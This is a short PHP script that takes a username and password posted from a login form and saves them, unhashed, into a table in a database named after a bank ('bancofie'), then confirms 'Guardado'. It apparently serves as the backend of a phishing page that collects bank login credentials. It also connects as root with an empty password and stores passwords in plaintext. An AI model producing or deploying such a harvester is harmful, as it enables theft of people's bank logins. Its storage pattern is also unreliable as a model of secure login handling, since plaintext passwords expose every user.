<?php
$conexion = new mysqli("localhost", "root", "", "bancofie");

if ($conexion->connect_error) {
    die("Error de conexión: " . $conexion->connect_error);
}

$usuario = isset($_POST['usuario']) ? trim($_POST['usuario']) : '';
$clave = isset($_POST['clave']) ? trim($_POST['clave']) : '';

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || $usuario === '' || $clave === '') {
    header('Location: index.php');
    exit;
}

$sql = "INSERT INTO accesos_fie (usuario, clave) VALUES (?, ?)";
$stmt = $conexion->prepare($sql);
$stmt->bind_param("ss", $usuario, $clave);

if ($stmt->execute()) {
    echo "<h2>Guardado</h2>";
    echo "<p>Con éxito.</p>";
    echo "<a href='index.php'>Volver al login</a>";
} else {
    echo "Error al guardar: " . $conexion->error;
}

$stmt->close();
$conexion->close();
?>